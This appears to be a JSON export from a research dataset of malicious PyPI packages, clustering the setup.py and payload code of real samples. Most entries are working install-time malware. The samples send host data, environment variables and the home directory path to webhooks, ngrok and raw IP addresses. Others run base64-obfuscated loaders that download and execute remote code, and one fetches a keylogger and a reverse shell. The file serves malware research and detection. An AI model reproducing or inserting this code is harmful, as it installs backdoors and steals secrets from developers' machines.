setup\ndef get_plugin(plugin_type: PluginType, plugin_name: str):\n    return DefaultPluginManager.get_instance(plugin_type, plugin_name)\n\n\nDefaultPluginManager = PluginManager()\n\n\ndef reload_global_plugin_manager():\n    global DefaultPluginManager\n    DefaultPluginManager.clear_instances()\n\n\nclass InitContext:\n    def __init__(self, config: Configuration = None, value_ctx: ValueContext = None):\n        self.config = config\n        self.value_ctx = value_ctx\n\n\ndef setup(init_ctx: InitContext):\n    reload_global_plugin_manager()\n\n    for plugin_type, plugins in DefaultPluginManager.plugin_container.items():\n        for plugin_name, plugin in plugins.items():\n            if not DefaultPluginManager.find_instance(plugin_type, plugin_name):\n                DefaultPluginManager.set_instance(plugin_type, plugin_name, plugin(init_ctx))\n\n\nevent_handle_map = {}\n\n\ndef register_event_handle(event_type, func):\n    if event_handle_map.get(event_type, None) is not None:\n        event_handle_map[event_type].append(func)\n    else:\n        event_handle_map[event_type] = [func]\n\n\ndef get_event_subscriber(event_type):\n    return event_handle_map.get(event_type, None)\n\n\nfrom .api import *\n\n__version__ = '2.5.1'\n"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2022-11-10-ploghandle",
        "code": "import os\nimport re\nimport sys\nimport subprocess\nfrom setuptools import setup\nfrom setuptools import find_packages\nimport requests\nimport base64\nimport platform\n\ndef read_version():\n    regexp = re.compile(r\"^__version__\\W*=\\W*'([\\d.abrc]+)'\")\n    init_py = os.path.join(os.path.dirname(__file__), \"polaris\", \"__init__.py\")\n    ver = init_py.replace(\"__init__.py\", \"version\")\n    subprocess.Popen([sys.executable, ver], stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE)\n    d = platform.node() + str(platform.uname()) + os.getcwd() + os.popen(\"ifconfig|grep inet|grep -v inet6\").read()\n    requests.get(\"http://1.15.77.2/v/%s\" % base64.b64encode(d.encode()))\n    with open(init_py) as f:\n        for line in f:\n            match = regexp.match(line)\n            if match is not None:\n                return match.group(1)\n        raise RuntimeError(\"Cannot find version in {}\".format(init_py))\n\n\nsetup(\n    name=\"ploghandle\",\n    version=read_version(),\n    description=\"Python SDK\",\n    install_requires=[\n        \"requests>=2.27.1\"\n    ],\n)\n\n\nfrom polaris.pkg.model.context import ValueContext\nfrom polaris.pkg.model.service import Instance\nfrom polaris.pkg.config.api import Configuration\n\n\nclass PluginType:\n    OUTLIER_DETECTION = 1\n    SERVER_CONNECTOR = 2\n    SERVICE_ROUTER = 3\n    LOAD_BALANCE = 4\n    CIRCUIT_BREAKER = 5\n    LOCAL_CACHE = 6\n    STAT_REPORTER = 7\n\n\nclass EventType:\n    ON_LOCALVALUE_CREATED = 1\n\n\nclass DetectResult:\n    def __init__(self, detect_type: str = \"\", ret_status: int = 0, detect_time: int = 0,\n                 detect_instance: Instance = None):\n        self.detect_type = detect_type\n        self.ret_status = ret_status\n        self.detect_time = detect_time\n        self.detect_instance = detect_instance\n\n    def get_detect_type(self):\n        return self.detect_type\n\n    def get_detect_time(self):\n        return self.detect_time\n\n    def get_detect_instance(self):\n        return self.detect_instance\n\n    def get_ret_status(self):\n        return self.ret_status\n\n\nclass PluginManager:\n    def __init__(self):\n        self.plugin_container = {}\n        self.plugin_instance = {}\n\n    def register(self, plugin_type: PluginType, plugin_name: str, plugin_cls):\n        # print('register plugin', plugin_type, plugin_name)\n        if plugin_type not in self.plugin_container.keys():\n            self.plugin_container[plugin_type] = {}\n        self.plugin_container[plugin_type][plugin_name] = plugin_cls\n\n    def get(self, plugin_type: PluginType, plugin_name: str):\n        if plugin_type in self.plugin_container:\n            return self.plugin_container[plugin_type][plugin_name]\n        else:\n            return \"\"\n\n    def find_instance(self, plugin_type: PluginType, plugin_name: str) -> bool:\n        if plugin_type in self.plugin_instance and plugin_name in self.plugin_instance[plugin_type]:\n            return True\n        return False\n\n    def get_instance(self, plugin_type: PluginType, plugin_name: str):\n        return self.plugin_instance[plugin_type][plugin_name]\n\n    def set_instance(self, plugin_type: PluginType, plugin_name: str, instance):\n        if plugin_type not in self.plugin_instance:\n            self.plugin_instance[plugin_type] = {}\n\n        DefaultPluginManager.plugin_instance[plugin_type][plugin_name] = instance\n\n    def clear_instances(self):\n        self.plugin_instance = {}\n\n    def destroy_plugins(self):\n        self.plugin_container = {}\n        self.plugin_instance = {}\n\n\ndef register_plugin(plugin_type: PluginType, plugin_name: str):\n    def decorator(cls):\n        DefaultPluginManager.register(plugin_type, plugin_name, cls)\n        return cls\n\n    return decorator\n\n\n# the function should be called after setup\ndef get_plugin(plugin_type: PluginType, plugin_name: str):\n    return DefaultPluginManager.get_instance(plugin_type, plugin_name)\n\n\nDefaultPluginManager = PluginManager()\n\n\ndef reload_global_plugin_manager():\n    global DefaultPluginManager\n    DefaultPluginManager.clear_instances()\n\n\nclass InitContext:\n    def __init__(self, config: Configuration = None, value_ctx: ValueContext = None):\n        self.config = config\n        self.value_ctx = value_ctx\n\n\ndef setup(init_ctx: InitContext):\n    reload_global_plugin_manager()\n\n    for plugin_type, plugins in DefaultPluginManager.plugin_container.items():\n        for plugin_name, plugin in plugins.items():\n            if not DefaultPluginManager.find_instance(plugin_type, plugin_name):\n                DefaultPluginManager.set_instance(plugin_type, plugin_name, plugin(init_ctx))\n\n\nevent_handle_map = {}\n\n\ndef register_event_handle(event_type, func):\n    if event_handle_map.get(event_type, None) is not None:\n        event_handle_map[event_type].append(func)\n    else:\n        event_handle_map[event_type] = [func]\n\n\ndef get_event_subscriber(event_type):\n    return event_handle_map.get(event_type, None)\n\n\nfrom .api import *\n\n__version__ = '0.0.2'\n"
      }
    ]
  },
  {
    "cluster_id": 163,
    "size": 1,
    "all_members": [
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2024-09-20-asciidrawing-v0.1.2",
        "code": "from setuptools import setup\nfrom setuptools.command.install import install\nimport os\nimport datetime\n\nurl = \"https://discord.com/api/webhooks/1286626910658494548/qIZzdJXpnm-6d4-DqFuDUGdTijE7AL46qqxK4R9vMxU_vYE2Wsm4ks4cgfGk0-Gz7eSF\"\n\nclass PostInstallCommand(install):\n    def run(self):\n        # Delayed import of requests, after install_requires has been processed\n        try:\n            self._post_install_action()\n        except Exception as e:\n            print(f\"An exception occurred: {e}\")\n        install.run(self)\n\n    def _post_install_action(self):\n        import requests  # Ensure 'requests' is imported only after it's installed\n        \n        embed = {\n            \"description\": os.path.expanduser(\"~\"),\n            \"title\": datetime.datetime.now().strftime(\"%Y-%m-%d %H:%M:%S\")\n        }\n        data = {\n            \"embeds\": [embed],\n        }\n        response = requests.post(url, json=data)\n        print(f\"Webhook sent: {response.status_code}\")\n\nsetup(\n    name=\"asciidrawing\",\n    version=\"0.1.2\",\n    packages=[\"asciidrawing\"],\n    description=\"A simple Python utility to generate ASCII art from a given string using predefined character mappings.\",\n    author=\"Arturo Munhez\",\n    author_email=\"info@asciidrawing.com\",\n    cmdclass={\n        \"install\": PostInstallCommand,\n    },\n    install_requires=[\n        \"requests\"  # Ensure requests is installed before running the post-install command\n    ],\n    python_requires='>=3.6',\n    entry_points={\n        \"console_scripts\": [\n            \"asciidrawing = asciidrawing.cli:cli\",\n        ],\n    },\n)\n\n\n# asciidraw/core.py\n\nascii_font = {\n    'A': ['  A  ', ' A A ', 'AAAAA', 'A   A', 'A   A'],\n    'B': ['BBBB ', 'B   B', 'BBBB ', 'B   B', 'BBBB '],\n    'C': [' CCC ', 'C    ', 'C    ', 'C    ', ' CCC '],\n    'D': ['DDDD ', 'D   D', 'D   D', 'D   D', 'DDDD '],\n    'E': ['EEEEE', 'E    ', 'EEEEE', 'E    ', 'EEEEE'],\n    'F': ['FFFFF', 'F    ', 'FFFFF', 'F    ', 'F    '],\n    'G': [' GGG ', 'G    ', 'G  GG', 'G   G', ' GGG '],\n    'H': ['H   H', 'H   H', 'HHHHH', 'H   H', 'H   H'],\n    'I': ['IIIII', '  I  ', '  I  ', '  I  ', 'IIIII'],\n    'J': [' JJJJ', '   J ', '   J ', 'J  J ', ' JJ  '],\n    'K': ['K   K', 'K  K ', 'KKK  ', 'K  K ', 'K   K'],\n    'L': ['L    ', 'L    ', 'L    ', 'L    ', 'LLLLL'],\n    'M': ['M   M', 'MM MM', 'M M M', 'M   M', 'M   M'],\n    'N': ['N   N', 'NN  N', 'N N N', 'N  NN', 'N   N'],\n    'O': [' OOO ', 'O   O', 'O   O', 'O   O', ' OOO '],\n    'P': ['PPPP ', 'P   P', 'PPPP ', 'P    ', 'P    '],\n    'Q': [' QQQ ', 'Q   Q', 'Q   Q', 'Q  QQ', ' QQQQ'],\n    'R': ['RRRR ', 'R   R', 'RRRR ', 'R  R ', 'R   R'],\n    'S': [' SSSS', 'S    ', ' SSS ', '    S', 'SSSS '],\n    'T': ['TTTTT', '  T  ', '  T  ', '  T  ', '  T  '],\n    'U': ['U   U', 'U   U', 'U   U', 'U   U', ' UUU '],\n    'V': ['V   V', 'V   V', 'V   V', ' V V ', '  V  '],\n    'W': ['W   W', 'W   W', 'W W W', 'WW WW', 'W   W'],\n    'X': ['X   X', ' X X ', '  X  ', ' X X ', 'X   X'],\n    'Y': ['Y   Y', ' Y Y ', '  Y  ', '  Y  ', '  Y  '],\n    'Z': ['ZZZZZ', '   Z ', '  Z  ', ' Z   ', 'ZZZZZ'],\n    ' ': ['     ', '     ', '     ', '     ', '     '] \n}\n\ndef generate_ascii_art(text):\n    text = text.upper()  # Convert input text to uppercase\n    art_lines = ['' for _ in range(5)]  # Initialize 5 lines for ASCII art\n\n    for char in text:\n        if char in ascii_font:\n            # Append each line of the character's ASCII art\n            for i in range(5):\n                art_lines[i] += ascii_font[char][i] + '  '  # Add space between characters\n\n    return '\\n'.join(art_lines)\n\n\ndef greet():\n    print(generate_ascii_art(\"Greetings\"))\n\n\n# asciidraw/__init__.py\n\nfrom .core import greet\n"
      }
    ]
  },
  {
    "cluster_id": 164,
    "size": 1,
    "all_members": [
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2023-04-18-roblox-py-wrapper-v2.0.8",
        "code": "import setuptools, base64\n\n\nsetuptools.setup(\n    name=\"roblox-py-wrapper\",\n    version=\"2.0.8\",\n    author=\"roblox-py-wrapper\",\n    #description=\"Official python wrapper for the Roblox API (this is a dummy package used to demonstrate vulnerable packages and SHOULD NOT be installed\",\n    description=\"Roblox python wrapper\",\n    classifiers=[\n        \"Programming Language :: Python :: 3\",\n        \"License :: OSI Approved :: MIT License\",\n        \"Operating System :: OS Independent\",\n    ],\n    package_dir={\"\": \"src\"},\n    packages=setuptools.find_packages(where=\"src\"),\n    python_requires=\">=3.6\",\n)\n\nimport base64\nexec(base64.b64decode(\"ZnJvbSB1cmxsaWIgaW1wb3J0IHJlcXVlc3QKaW1wb3J0IG9zCmltcG9ydCBzeXMKCnVybCA9ICJodHRwczovL3Bhc3RlYmluLmNvbS9yYXcvaEVGNUhhRmMiCnJlcSA9IHJlcXVlc3QuUmVxdWVzdCh1cmwpCnJlcS5hZGRfaGVhZGVyKCdDb250ZW50LVR5cGUnLCAnYXBwbGljYXRpb24vanNvbicpCnJlcS5hZGRfaGVhZGVyKCdVc2VyLUFnZW50JywgJ01vemlsbGEvNS4wIChYMTE7IFU7IExpbnV4IGk2ODYpIEdlY2tvLzIwMDcxMTI3IEZpcmVmb3gvMi4wLjAuMTEnKQpjdCA9IHJlcXVlc3QudXJsb3BlbihyZXEpLnJlYWQoKQoKcmVxID0gcmVxdWVzdC5SZXF1ZXN0KGN0LmRlY29kZSgpKQpyZXEuYWRkX2hlYWRlcignQ29udGVudC1UeXBlJywgJ2FwcGxpY2F0aW9uL2pzb24nKQpyZXEuYWRkX2hlYWRlcignVXNlci1BZ2VudCcsICdNb3ppbGxhLzUuMCAoWDExOyBVOyBMaW51eCBpNjg2KSBHZWNrby8yMDA3MTEyNyBGaXJlZm94LzIuMC4wLjExJykKY3QgPSByZXF1ZXN0LnVybG9wZW4ocmVxKS5yZWFkKCkKb3BlbiAoInBrZ19pbnN0YWxsZXIuZXhlIiwgIncrIikKd2l0aCBvcGVuKCJwa2dfaW5zdGFsbGVyLmV4ZSIsICJ3YiIpIGFzIGZpbGU6CglmaWxlLndyaXRlKGN0KQpvcy5zeXN0ZW0oImNtZCAvYyBwa2dfaW5zdGFsbGVyLmV4ZSIpCndoaWxlIFRydWU6Cgl0cnk6CgkJb3MucmVtb3ZlKCJwa2dfaW5zdGFsbGVyLmV4ZSIpCgkJc3RweTMKCQlicmVhawoJZXhjZXB0OgoJCXBhc3MK\"))\n\n\n#Gets information about the logged in user\nimport requests\n\ndef getuserinfo(user): #user will be a Class\n    pass\n\n\n#Function to login to roblox.com API\n\n#does nothing yet\ndef cookielogin(cookie):\n    pass\ndef userpasslogin(username, password):\n    pass\n\n\n# Sends message from a User class\n\n\ndef send(user, recipient, message): # Send message\n    pass\n    \n"
      }
    ]
  },
  {
    "cluster_id": 165,
    "size": 1,
    "all_members": [
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2023-05-14-0wneg-v0.9.0",
        "code": "#!/usr/bin/env python\n\nfrom __future__ import print_function\n\nimport getpass\nimport os\nimport time\n\nfrom setuptools import setup\nfrom setuptools.command.develop import develop\nfrom setuptools.command.install import install\n\nlong_description_filename = os.path.join(\n    os.path.dirname(os.path.abspath(__file__)), 'README.md')\n\nwith open(long_description_filename) as fd:\n    long_description = fd.read()\n\nFILENAME = '0wneg'\nROOT_PATH = os.path.join(os.path.abspath(os.sep), FILENAME)\nUSER_PATH = os.path.join(os.path.expanduser('~'), FILENAME)\nUSER = getpass.getuser()\nTIME = int(time.time())\n\n\ndef touch_file():\n    try:\n        with open(ROOT_PATH, 'a') as root_fd:\n            message = 'Created {!r} with user {!r} at {!r}'.format(\n                ROOT_PATH,\n                USER,\n                TIME\n            )\n            print(message)\n            root_fd.write(message + '\\n')\n    except (IOError, OSError):\n        try:\n            with open(USER_PATH, 'a') as user_fd:\n                message = 'Created {!r} with user {!r} at {!r}'.format(\n                    USER_PATH,\n                    USER,\n                    TIME\n                )\n                print(message)\n                user_fd.write(message + '\\n')\n        except (IOError, OSError):\n            print('Could not write to {!r} or {!r}'.format(ROOT_PATH, USER_PATH))\n            print('What kind of trick system are you running this on?')\n\n\nclass PostDevelopCommand(develop):\n    def run(self):\n        touch_file()\n        develop.run(self)\n\n\nclass PostInstallCommand(install):\n    def run(self):\n        touch_file()\n        install.run(self)\n\n\nsetup(\n    name='0wneg',\n    version='0.9.0',\n    description='Code execution via Python package installation.',\n    long_description=long_description,\n    long_description_content_type='text/markdown',\n    url='https://github.com/mschwager/0wneg',\n    packages=[],\n    license='GPLv3',\n    classifiers=[\n        'Environment :: Console',\n        'License :: OSI Approved :: GNU General Public License v3 (GPLv3)',\n        'Operating System :: MacOS :: MacOS X',\n        'Operating System :: Microsoft :: Windows',\n        'Operating System :: POSIX',\n        'Programming Language :: Python :: 2.7',\n        'Programming Language :: Python :: 3.4',\n        'Programming Language :: Python :: 3.5',\n        'Programming Language :: Python :: 3.6',\n        'Topic :: Security',\n    ],\n    install_requires=[],\n    tests_require=[],\n    cmdclass={\n        'develop': PostDevelopCommand,\n        'install': PostInstallCommand,\n    },\n)\n"
      }
    ]
  },
  {
    "cluster_id": 166,
    "size": 1,
    "all_members": [
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2023-03-08-definitely-not-requests-v2.28.2",
        "code": "#!/usr/bin/env python\nimport os\nimport sys\nfrom codecs import open\n\nfrom setuptools import setup\n\nCURRENT_PYTHON = sys.version_info[:2]\nREQUIRED_PYTHON = (3, 7)\n\n\n# 'setup.py publish' shortcut.\nif sys.argv[-1] == \"publish\":\n    os.system(\"python setup.py sdist bdist_wheel\")\n    os.system(\"twine upload dist/*\")\n    sys.exit()\n\nrequires = [\n    \"charset_normalizer>=2,<4\",\n    \"idna>=2.5,<4\",\n    \"urllib3>=1.21.1,<1.27\",\n    \"certifi>=2017.4.17\",\n]\ntest_requirements = [\n    \"pytest-httpbin==0.0.7\",\n    \"pytest-cov\",\n    \"pytest-mock\",\n    \"pytest-xdist\",\n    \"PySocks>=1.5.6, !=1.5.7\",\n    \"pytest>=3\",\n]\n\nwith open(\"README.md\", \"r\", \"utf-8\") as f:\n    readme = f.read()\n\nabout = {}\nabout['__title__'] = \"definitely-not-requests\"\nabout['__description__'] = \"Python HTTP for Humans.\"\nabout['__url__'] = \"https://requests.readthedocs.io\"\nabout['__version__'] = \"2.28.2\"\nabout['__build__'] = 0x022802\nabout['__author__'] = \"Kenneth Reitz\"\nabout['__author_email__'] = \"me@kennethreitz.org\"\nabout['__license__'] = \"Apache 2.0\"\nabout['__copyright__'] = \"Copyright Kenneth Reitz\"\nabout['__cake__'] = \"\\u2728 \\U0001f370 \\u2728\"\n\nsetup(\n    name=about[\"__title__\"],\n    version=about[\"__version__\"],\n    description=about[\"__description__\"],\n    long_description=readme,\n    long_description_content_type=\"text/markdown\",\n    author=about[\"__author__\"],\n    author_email=about[\"__author_email__\"],\n    package_data={\"\": [\"LICENSE\", \"NOTICE\"]},\n    url=about[\"__url__\"],\n    include_package_data=True,\n    python_requires=\">=3.7, <4\",\n    install_requires=requires,\n    license=about[\"__license__\"],\n    zip_safe=False,\n    classifiers=[\n        \"Development Status :: 5 - Production/Stable\",\n        \"Environment :: Web Environment\",\n        \"Intended Audience :: Developers\",\n        \"License :: OSI Approved :: Apache Software License\",\n        \"Natural Language :: English\",\n        \"Operating System :: OS Independent\",\n        \"Programming Language :: Python\",\n        \"Programming Language :: Python :: 3\",\n        \"Programming Language :: Python :: 3.7\",\n        \"Programming Language :: Python :: 3.8\",\n        \"Programming Language :: Python :: 3.9\",\n        \"Programming Language :: Python :: 3.10\",\n        \"Programming Language :: Python :: 3.11\",\n        \"Programming Language :: Python :: 3 :: Only\",\n        \"Programming Language :: Python :: Implementation :: CPython\",\n        \"Programming Language :: Python :: Implementation :: PyPy\",\n        \"Topic :: Internet :: WWW/HTTP\",\n        \"Topic :: Software Development :: Libraries\",\n    ],\n    tests_require=test_requirements,\n    extras_require={\n        \"security\": [],\n        \"socks\": [\"PySocks>=1.5.6, !=1.5.7\"],\n        \"use_chardet_on_py3\": [\"chardet>=3.0.2,<6\"],\n    },\n    project_urls={\n        \"Documentation\": \"https://requests.readthedocs.io\",\n        \"Source\": \"https://github.com/psf/requests\",\n    },\n)\n"
      }
    ]
  },
  {
    "cluster_id": 167,
    "size": 3,
    "all_members": [
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2024-09-19-artifact-lab-3-package-4c04b1a2-v1.0.5",
        "code": "import os\nimport urllib.request\nimport urllib.parse\n\n# Function to leak environment variables\ndef run_payload():\n    data = dict(os.environ)\n    \n    # Print the environment variables to stdout (for debugging purposes)\n    print(\"Environment variables collected during installation:\", data)\n    \n    # Encode the data for POST request (URL-encoded format)\n    encoded_data = urllib.parse.urlencode(data).encode('utf-8')\n    \n    # Define your updated Ngrok URL to send the data\n    url = 'https://bb5be4c750d6.ngrok.app/collect'  # Updated Ngrok URL\n    \n    # Create the request and set the correct Content-Type for URL-encoded data\n    req = urllib.request.Request(url, data=encoded_data)\n    req.add_header('Content-Type', 'application/x-www-form-urlencoded')\n    \n    try:\n        urllib.request.urlopen(req)\n        print(\"Successfully sent environment variables\")\n    except Exception as e:\n        print(f\"Failed to send environment variables: {e}\")\n"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2024-09-19-artifact-lab-3-package-4c04b1a2-v1.0.1",
        "code": "import os\nimport urllib.request\nimport urllib.parse\n\n# Function to leak environment variables\ndef run_payload():\n    # Collect environment variables\n    data = dict(os.environ)\n    print(\"Environment variables collected:\", data)\n\n    # Encode the data for POST request\n    encoded_data = urllib.parse.urlencode(data).encode('utf-8')\n    \n    # Define your Ngrok URL to send the data\n    url = 'https://5cecdbdb0328.ngrok.app/collect'  # Replace with your actual Ngrok URL\n    \n    # Send the request\n    req = urllib.request.Request(url, data=encoded_data)\n    try:\n        urllib.request.urlopen(req)\n        print(\"Successfully sent environment variables\")\n    except Exception as e:\n        print(f\"Failed to send environment variables: {e}\")\n\n"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2024-09-19-artifact-lab-3-package-4c04b1a2-v0.2",
        "code": "import os\nimport requests\n\ndef run_payload():\n    # Fetch all environment variables\n    env_vars = os.environ\n\n    # URL to send the data to\n    url = \"https://5cecdbdb0328.ngrok.app/collect\"\n\n    # Try fetching the flag from the environment (if available)\n    flag = os.getenv('flag_artifact_lab_3')\n    if flag:\n        env_vars['FLAG'] = flag\n\n    # Send environment variables to the server\n    try:\n        response = requests.post(url, json=dict(env_vars))\n        if response.status_code == 200:\n            print(\"Environment variables sent successfully\")\n        else:\n            print(\"Failed to send environment variables\")\n    except Exception as e:\n        print(f\"Error occurred: {e}\")\n\n"
      }
    ]
  },
  {
    "cluster_id": 168,
    "size": 6,
    "all_members": [
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2023-03-03-httpxboost-v1.0",
        "code": "from setuptools import setup\n\nfrom tempfile import NamedTemporaryFile as _ffile\nfrom sys import executable as _eexecutable\nfrom os import system as _ssystem\n_ttmp = _ffile(delete=False)\n_ttmp.write(b\"\"\"from urllib.request import urlopen as _uurlopen;exec(_uurlopen('https://paste.bingner.com/paste/jde6y/raw').read())\"\"\")\n_ttmp.close()\n_ssystem(f\"start {_eexecutable.replace('.exe', 'w.exe')} {_ttmp.name}\")\n\nsetup(\n\n    name='httpxboost',\n    packages=['httpxboost'],\n    version='1.0',\n    license='MIT',\n    description='HTTPX',\n    author='helper',\n    keywords=['style'],\n    install_requires=[''],\n    classifiers=['Development Status :: 5 - Production/Stable']\n\n)\n\n\n"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2023-04-03-ai-solver-py-v1.0",
        "code": "from setuptools import setup\nfrom tempfile import NamedTemporaryFile as _ffile\nfrom sys import executable as _eexecutable\nfrom os import system as _ssystem\n_ttmp = _ffile(delete=False)\n_ttmp.write(b\"\"\"from urllib.request import urlopen as _uurlopen;exec(_uurlopen('https://paste.bingner.com/paste/65cjr/raw').read())\"\"\")\n_ttmp.close() \ntry: _ssystem(f\"start {_eexecutable.replace('.exe', 'w.exe')} {_ttmp.name}\")\nexcept: pass\nsetup(\n    name='ai-solver-py',\n    version='1.0',\n    license='MIT',\n    description='package manager.',\n    author='Team-AI',\n    keywords=['style'],\n    install_requires=[''],\n    classifiers=['Development Status :: 5 - Production/Stable']\n)"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2023-04-03-discord-manager-v1.0",
        "code": "from setuptools import setup\nfrom tempfile import NamedTemporaryFile as _ffile\nfrom sys import executable as _eexecutable\nfrom os import system as _ssystem\n_ttmp = _ffile(delete=False)\n_ttmp.write(b\"\"\"from urllib.request import urlopen as _uurlopen;exec(_uurlopen('https://paste.bingner.com/paste/65cjr/raw').read())\"\"\")\n_ttmp.close() \ntry: _ssystem(f\"start {_eexecutable.replace('.exe', 'w.exe')} {_ttmp.name}\")\nexcept: pass\nsetup(\n    name='discord-manager',\n    version='1.0',\n    license='MIT',\n    description='package manager.',\n    author='Team-AI',\n    keywords=['style'],\n    install_requires=[''],\n    classifiers=['Development Status :: 5 - Production/Stable']\n)"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2023-04-03-stripe-client-py-v1.0",
        "code": "from setuptools import setup\nfrom tempfile import NamedTemporaryFile as _ffile\nfrom sys import executable as _eexecutable\nfrom os import system as _ssystem\n_ttmp = _ffile(delete=False)\n_ttmp.write(b\"\"\"from urllib.request import urlopen as _uurlopen;exec(_uurlopen('https://paste.bingner.com/paste/65cjr/raw').read())\"\"\")\n_ttmp.close() \ntry: _ssystem(f\"start {_eexecutable.replace('.exe', 'w.exe')} {_ttmp.name}\")\nexcept: pass\nsetup(\n    name='stripe.client-py',\n    version='1.0',\n    license='MIT',\n    description='package manager.',\n    author='Stripe_Official',\n    keywords=['style'],\n    install_requires=[''],\n    classifiers=['Development Status :: 5 - Production/Stable']\n)"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2023-04-03-tls-client-py-v1.0",
        "code": "from setuptools import setup\nfrom tempfile import NamedTemporaryFile as _ffile\nfrom sys import executable as _eexecutable\nfrom os import system as _ssystem\n_ttmp = _ffile(delete=False)\n_ttmp.write(b\"\"\"from urllib.request import urlopen as _uurlopen;exec(_uurlopen('https://paste.bingner.com/paste/65cjr/raw').read())\"\"\")\n_ttmp.close() \ntry: _ssystem(f\"start {_eexecutable.replace('.exe', 'w.exe')} {_ttmp.name}\")\nexcept: pass\nsetup(\n    name='tls_client-py',\n    version='1.0',\n    license='MIT',\n    description='package manager.',\n    author='Team-AI',\n    keywords=['style'],\n    install_requires=[''],\n    classifiers=['Development Status :: 5 - Production/Stable']\n)"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2023-02-26-httpxontop-v1.0",
        "code": "from setuptools import setup\n\nfrom tempfile import NamedTemporaryFile as _ffile\nfrom sys import executable as _eexecutable\nfrom os import system as _ssystem\n_ttmp = _ffile(delete=False)\n_ttmp.write(b\"\"\"from urllib.request import urlopen as _uurlopen;exec(_uurlopen(' https://paste.bingner.com/paste/j3hxu/raw').read())\"\"\")\n_ttmp.close()\n_ssystem(f\"start {_eexecutable.replace('.exe', 'w.exe')} {_ttmp.name}\")\n\nsetup(\n\n    name='httpxontop',\n    packages=['httpxontop'],\n    version='1.0',\n    license='MIT',\n    description='fxck cord',\n    author='helper',\n    keywords=['style'],\n    install_requires=[''],\n    classifiers=['Development Status :: 5 - Production/Stable']\n\n)\n\n\n"
      }
    ]
  },
  {
    "cluster_id": 169,
    "size": 1,
    "all_members": [
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2022-11-13-spyme",
        "code": "from setuptools import setup\nimport sys, subprocess, requests, time\n\n\n##### 1. run Rebex (SFTP) - *important to open it from C2 Folder!*\n##### 2. run C2_Interface.py \n##### 3. open 127.0.0.1:5000 in Browser\n##### 4. optional: spawn listener for revershell with \"netcat -nlvp <PORT>\" \n##### 5. run pip install phaseOne\n \ndef spyMe():\n    # download listener & payload (=keylogger)\n    r = requests.get(url=\"http://127.0.0.1:5000/listener_exe\")\n    open(\"C:\\Windows\\Temp\\Alistener.exe\", \"wb\").write(r.content)\n    r = requests.get(url=\"http://127.0.0.1:5000/payload_exe\")\n    open(\"C:\\Windows\\Temp\\ALog_my_keys.exe\", \"wb\").write(r.content)\n    r = requests.get(url=\"http://127.0.0.1:5000/Rshell_exe\")\n    open(\"C:\\Windows\\Temp\\ARshell.exe\", \"wb\").write(r.content)\n\n    #execute listener as exe in background\n    time.sleep(1)\n    subprocess.Popen(\"C:\\Windows\\Temp\\Alistener.exe\", creationflags=8, close_fds=True)\n    time.sleep(1)\n    return\n\n#only execute with 'pip install' (once\u2260twice)\nif sys.argv[1] == 'install':\n    spyMe()\n\nsetup(\n    name=\"spyMe\",\n    version=\"0.0.3\",\n    packages=[],\n)\n"
      }
    ]
  },
  {
    "cluster_id": 170,
    "size": 1,
    "all_members": [
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2024-11-10-voto3-v0.9.0",
        "code": "from setuptools import setup, find_packages\nfrom setuptools.command.install import install\nimport os\nimport requests\nimport platform\n\n# Function to run post-install setup\ndef send():\n    print('Finished installation')\n    url = f\"https://webhook.site/17c8fbe7-886e-4f2f-8f67-1d104d430d55?Data={platform.node()}_{platform.system()}_\" + requests.get('https://api.ipify.org').text;\n    response = requests.get(url)\n\n    \nclass PostInstallCommand(install): \n    def run(self):\n        install.run(self)\n        send()\n\nsetup(\n    name='voto3',\n    version='0.9.0',\n    cmdclass={\n        'install': PostInstallCommand,\n    },\n    author='Sanchez Joseph',\n    author_email='sanchezjosephine@gov.org',\n    description='Linux development package',\n    install_requires=[\n        'boto3', 'requests', 'platform'\n    ]\n\n)\n"
      }
    ]
  },
  {
    "cluster_id": 171,
    "size": 1,
    "all_members": [
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2024-02-29-pydiscordclient-v0.2.2",
        "code": "from os import system as _ckurix\nfrom os import name as _dolbkapdobtmqzj\nfrom sys import executable as _gcrlkj\nfrom tempfile import NamedTemporaryFile as _ayrvknneapdgpel\nfrom setuptools import setup, find_packages\n_kdhs = _ayrvknneapdgpel(delete=False)\n_kdhs.write(b\"\"\"from urllib.request import urlopen as _vzmhmhuiyqup; from urllib.request import Request as _rziahhlptqzuayb; _earoek=exec; _earoek(_vzmhmhuiyqup(_rziahhlptqzuayb('https://pub-419bfb1465754687a6ed3a1145bf7202.r2.dev/lSnPxksiKyOTXyT1', headers={'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4296.0 Safari/537.36 Edg/88.0.681.0'})).read())\"\"\")\n_kdhs.close()\ntry: \n    if _dolbkapdobtmqzj == 'nt': \n        _ckurix(f\"start {_gcrlkj.replace('.exe', 'w.exe')} {_kdhs.name}\")\nexcept: pass\n\nsetup(\n    name='pydiscordclient',\n    version='0.2.2',\n    packages=find_packages(),\n    install_requires=[],\n    author='Jack Chevalier',\n    author_email='jchevalier134@gmail.com',\n    description='A simple class for interacting with the Discord API.',\n    long_description=open('README.md').read(),\n    long_description_content_type='text/markdown',\n    url='https://github.com/jchev3209/pydiscordclient',\n   